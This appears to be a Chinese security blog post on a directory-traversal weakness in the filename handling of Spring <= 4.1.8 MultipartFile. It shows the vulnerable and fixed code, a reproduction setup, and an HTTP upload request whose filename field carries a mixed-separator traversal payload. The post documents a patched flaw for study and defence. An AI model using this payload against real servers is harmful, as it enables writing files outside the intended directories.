最近挖洞的时候，注意到 **Spring &lt;= 4.1.8** 中提供的 `MultipartFile` 对象潜在的威胁，如果不注意就会造成 **目录穿越漏洞**

简介
==

**Spring-web** 默认提供了两个 `MultipartFile` 对象，分别是 `StandardMultipartFile`、`CommonsMultipartFile` 。**Spring-test** 中提供了一个 `MockMultipartFile` 对象用于处理文件上传请求。

`MultipartFile` 接口中声明的 `getOriginalFilename` 方法用于获取文件名

```java
String getOriginalFilename();
```

其中 `StandardMultipartFile` 和 `MockMultipartFile` 是没有对文件名进行处理的

StandardMultipartFile
---------------------

*org.springframework.web.multipart.support.StandardMultipartHttpServletRequest.StandardMultipartFile#getOriginalFilename*

```java
public String getOriginalFilename() {
    return this.filename;
}
```

MockMultipartFile
-----------------

*org.springframework.mock.web.MockMultipartFile#getOriginalFilename*

```java
public String getOriginalFilename() {
    return this.originalFilename;
}
```

SpringBoot 威胁
-------------

在使用 **SpringBoot** 中当没有自己手动配置的情况下默认使用的是 **`StandardMultipartFile`**. 在这种情况下直接通过 `getOriginalFilename` 方法获取文件名后，不进行处理就使用会造成目录穿越漏洞。如下代码来自 **spring-boot-autoconfigure-2.0.0.RELEASE**

*spring-boot-autoconfigure-2.0.0.RELEASE.jar!\\META-INF\\spring-autoconfigure-metadata.properties*

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-59ef1ac64f8b1b90e987ce66ab940c225ab1bfeb.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-59ef1ac64f8b1b90e987ce66ab940c225ab1bfeb.png)

CommonsMultipartFile
--------------------

而需要手动设置的 `CommonsMultipartFile` 中的 `getOriginalFilename` 方法对文件名进行了处理，如下代码的版本是 **`4.1.8.RELEASE`**, 但这里的过滤还是存在**绕过**，在 Windows 下可以使用 `../..\\..\\` 绕过造成目录穿越漏洞

```java
public String getOriginalFilename() {
    String filename = this.fileItem.getName();
    if (filename == null) {
        return "";
    } else {
        int pos = filename.lastIndexOf("/");
        if (pos == -1) {
            pos = filename.lastIndexOf("\\");
        }

        return pos != -1 ? filename.substring(pos + 1) : filename;
    }
}
```

修复
--

在 **Spring &gt;= 4.1.9.RELEASE**  修复该问题，如下是修复代码

*org.springframework.web.multipart.commons.CommonsMultipartFile#getOriginalFilename*

```java
public String getOriginalFilename() {
    String filename = this.fileItem.getName();
    if (filename == null) {
        return "";
    } else {
        int unixSep = filename.lastIndexOf("/");
        int winSep = filename.lastIndexOf("\\");
        int pos = winSep > unixSep ? winSep : unixSep;
        return pos != -1 ? filename.substring(pos + 1) : filename;
    }
}
```

复现
==

环境准备
----

在 `IDEA` 中新建一个 **WebApplication** 在 `pom.xml` 中添加 **Spring** 环境

```xml
<dependency>
    <groupId>org.springframework</groupId>
    <artifactId>spring-context</artifactId>
    <version>4.1.8.RELEASE</version>
</dependency>
<dependency>
    <groupId>org.springframework</groupId>
    <artifactId>spring-webmvc</artifactId>
    <version>4.1.8.RELEASE</version>
</dependency>
```

新建 `Controller`

*src/main/java/com/example/controller/UserController.java*

```java
package com.example.controller;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.multipart.MultipartFile;

@Controller
public class UserController {
    @RequestMapping("/q")
    @ResponseBody
    public String upload(@RequestParam("multipartFile") MultipartFile multipartFile) {
        String originalFilename = multipartFile.getOriginalFilename();

        return "Filename: " + originalFilename;
    }
}

```

新建 `spring-mvc.xml` 配置组件扫描

*src/main/resources/spring-mvc.xml*

```xml
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xmlns:context="http://www.springframework.org/schema/context"
       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd">

    <context:component-scan base-package="com.example.controller"/>

    <!-- 设置 multipartResolver -->
    <bean id="multipartResolver" class="org.springframework.web.multipart.commons.CommonsMultipartResolver" />
</beans>
```

在 `web.xml` 中设置视图调用器

```xml
<servlet>
    <servlet-name>DispatcherServlet</servlet-name>
    <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>
    <init-param>
        <param-name>contextConfigLocation</param-name>
        <param-value>classpath:spring-mvc.xml</param-value>
    </init-param>
    <load-on-startup>1</load-on-startup>
</servlet>

<servlet-mapping>
    <servlet-name>DispatcherServlet</servlet-name>
    <url-pattern>/</url-pattern>
</servlet-mapping>

<absolute-ordering/>
```

使用 **Tomcat** 启动项目

文件上传 - CommonsMultipartFile Windows 下的目录穿越漏洞
--------------------------------------------

准备一个文件上传表单

```html
<form action="/q" method="post" enctype="multipart/form-data">
    <input name="multipartFile" type="file">
    <input type="submit">
</form>
```

随机选择一个文件上传使用 **BurpSuite** 截断数据包进行测试

```http
POST /q HTTP/1.1
Host: 192.168.127.1:8080
Content-Length: 213
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: null
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3AaOArHsDAwbStyx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

------WebKitFormBoundary3AaOArHsDAwbStyx
Content-Disposition: form-data; name="multipartFile"; filename="a.txt"
Content-Type: application/octet-stream

Hello World
------WebKitFormBoundary3AaOArHsDAwbStyx--
```

### 绕过

```php
POST /q HTTP/1.1
Host: 192.168.127.1:8080
Content-Length: 224
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: null
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3AaOArHsDAwbStyx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

------WebKitFormBoundary3AaOArHsDAwbStyx
Content-Disposition: form-data; name="multipartFile"; filename="../..\\..\\a.txt"
Content-Type: application/octet-stream

Hello World
------WebKitFormBoundary3AaOArHsDAwbStyx--

```

[![](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-be865eb963138ca5745b78d958855a609eb910c6.png)](https://shs3.b.qianxin.com/attack_forum/2021/10/attach-be865eb963138ca5745b78d958855a609eb910c6.png)

Reference
=========

[Spring-framework Getting Started | Uploading Files](https://spring.io/guides/gs/uploading-files/)

[Spring-framework Interface MultipartFile](https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/web/multipart/MultipartFile.html)

[Spring-framework mvc-multipart](https://docs.spring.io/spring-framework/docs/3.0.x/reference/mvc.html#mvc-multipart)